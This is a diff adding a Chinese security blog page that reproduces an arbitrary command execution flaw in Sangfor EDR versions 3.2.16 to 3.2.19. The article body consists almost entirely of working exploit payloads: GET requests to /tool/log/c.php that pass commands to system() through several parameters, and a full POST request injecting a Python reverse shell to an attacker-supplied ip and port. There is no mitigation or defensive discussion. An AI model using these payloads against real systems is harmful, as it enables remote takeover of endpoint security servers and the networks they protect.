@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）一、漏洞简介二、漏洞影响深信服EDR 3.2.16 深信服EDR 3.2.17 深信服EDR 3.2.19 三、复现过程payload：https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;limit&#x3D;whoami  https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0%EF%BC%88EDR%EF%BC%89%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）一、漏洞简介二、漏洞影响深信服EDR 3.2.16 深信服EDR 3.2.17 深信服EDR 3.2.19 三、复现过程payload：https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;limit&#x3D;whoami  https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0(EDR)%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId25.png">
+<meta property="article:published_time" content="2022-07-08T06:26:10.842Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0(EDR)%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-深信服/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0%EF%BC%88EDR%EF%BC%89%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.842Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="深信服-终端检测相应平台（EDR）-任意命令执行漏洞（一）"><a href="#深信服-终端检测相应平台（EDR）-任意命令执行漏洞（一）" class="headerlink" title="深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）"></a>深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>深信服EDR 3.2.16</p>
+<p>深信服EDR 3.2.17</p>
+<p>深信服EDR 3.2.19</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre><code>https://www.0-sec.org/tool/log/c.php?strip_slashes=system&amp;limit=whoami
+
+https://www.0-sec.org/tool/log/c.php?strip_slashes=system&amp;host=whoami
+
+https://www.0-sec.org/tool/log/c.php?strip_slashes=system&amp;path=whoami
+
+https://www.0-sec.org/tool/log/c.php?strip_slashes=system&amp;row=whoami
+</code></pre>
+<p><img src="/resource/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0(EDR)%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId25.png" alt="1.png"></p>
+<h3 id="反弹shell-payload"><a href="#反弹shell-payload" class="headerlink" title="反弹shell payload"></a>反弹shell payload</h3><pre><code>POST /tool/log/c.php HTTP/1.1
+Host: www.0-sec.org
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
+DNT: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded;charset=utf-8
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903
+Content-Length: 256
+
+strip_slashes=system&amp;host=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0%EF%BC%88EDR%EF%BC%89%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2r0z800qcy8v18njw0vyr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0%EF%BC%88EDR%EF%BC%89%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E8%A7%A3%E5%AF%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
